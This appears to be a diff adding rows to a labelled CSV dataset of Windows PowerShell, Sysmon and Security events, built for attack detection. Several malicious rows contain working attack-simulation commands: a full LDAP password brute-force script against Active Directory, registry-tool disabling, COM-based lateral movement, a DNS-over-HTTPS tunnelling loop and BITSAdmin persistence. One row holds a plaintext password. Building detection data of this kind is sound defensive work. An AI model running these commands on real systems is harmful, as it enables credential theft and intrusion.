+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-079,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-13T17:14:19.4218772+00:00,Server002,,,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.4894
+	HostId=36f6a86d-5072-4305-9b9d-86e0078f3204
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.19041.4894
+	RunspaceId=7a579211-0b3f-4ae9-99cf-44101bdf3876
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-080,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:21:36.2177333+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=eb790f13-daa5-4f75-803e-24b6904ee9b5
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname
+	EngineVersion=5.1.19041.2673
+	RunspaceId=0a7ef49c-6838-49c2-a599-9608b6bb5fc2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-081,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,403,2024-10-24 13:19:20.2309205,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Stopped, Available, 	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=f51dd722-90c0-4d26-9d8e-b9a7acc9f51e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 403 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-082,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-28 16:20:51.0059807,Server002,SERVER002\admin_test,C:\Windows\System32\chcp.com,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\chcp.com; user=SERVER002\admin_test,"The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: C:\Windows\System32\chcp.com"
+CYB499-083,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:59.2275139,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
+CYB499-084,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.4638733,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Registry, Started, 	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-085,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:57:56.5092275+00:00,Server002,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential ($username, $password)",,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=03cdc647-5a1b-4f15-bb99-431490edba2b
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential ($username, $password)
+	EngineVersion=5.1.19041.2673
+	RunspaceId=4edbd26b-bcda-4f99-8836-5cb27cd9c18d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object ...; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-086,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Function, Started, 	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-087,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4738,2025-04-30T08:10:10.5776205+00:00,Server002,WORKGROUP\SERVER002$,,,,,,,,,Security event 4738 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$; detail=A user account was changed,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-088,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-03T10:08:19.2543554+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId ce8093d4-60d9-41f4-a2f7-4974adf958a5 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-089,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4672,2025-04-29T17:42:56.5276620+00:00,Server002,NT AUTHORITY\SYSTEM (S-1-5-18),,,,,,,,,Security event 4672 from Microsoft-Windows-Security-Auditing on Server002; user=NT AUTHORITY\SYSTEM (S-1-5-18); detail=Administrative logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-090,Malicious,Sysmon,Defense Evasion,defense_evasion_disable_windows_registry_tool,data/raw/malicious/defense_evasion_disable_windows_registry_tool_json/T1112-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 14:46:00.2757251,Server002,SERVER002\admin_test,C:\Windows\System32\reg.exe,reg  add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\reg.exe; cmd=reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; user=SERVER002\admin_test",The event modifies the DisableRegistryTools policy value to restrict registry tooling. Evidence: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
+CYB499-091,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:31:31.2395011+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\System32\autochk.exe,\??\C:\Windows\system32\autochk.exe *,C:\Windows\System32\smss.exe,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\autochk.exe; cmd=\??\C:\Windows\system32\autochk.exe *; parent=C:\Windows\System32\smss.exe; parent_cmd=\SystemRoot\System32\smss.exe; user=NT AUTHORITY\SYSTEM; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-092,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Environment, Started, 	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-093,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4798,2025-04-29T17:28:15.8567546+00:00,Server002,WORKGROUP\SERVER002$ (S-1-5-18),,,,,,,,,Security event 4798 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$ (S-1-5-18); detail=A user's local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-094,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.7007798,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"FileSystem, Started, 	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-095,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,403,2024-10-21 11:25:03.4205134,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Stopped, Available, 	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=18
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 403 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-096,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T13:57:29.4037423+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Service; Get-Process,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=391cd406-d432-41bb-a185-f87d549b8ab9
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Service; Get-Process
+	EngineVersion=5.1.19041.2673
+	RunspaceId=f8c0ef00-225c-4554-b366-d15af16e2a7b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Service; Get-Process; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-097,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.7129626,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Function, Started, 	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-098,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.6363429,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
+CYB499-099,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4672,2025-04-29T17:33:24.2116967+00:00,Server002,NT AUTHORITY\SYSTEM (S-1-5-18),,,,,,,,,Security event 4672 from Microsoft-Windows-Security-Auditing on Server002; user=NT AUTHORITY\SYSTEM (S-1-5-18); detail=Administrative logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-100,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T16:54:31.7584801+00:00,Server002,NT AUTHORITY\LOCAL SERVICE,C:\Windows\System32\audiodg.exe,C:\Windows\system32\AUDIODG.EXE 0x318 0x2ec,C:\Windows\System32\svchost.exe,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\audiodg.exe; cmd=C:\Windows\system32\AUDIODG.EXE 0x318 0x2ec; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p; user=NT AUTHORITY\LOCAL SERVICE; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
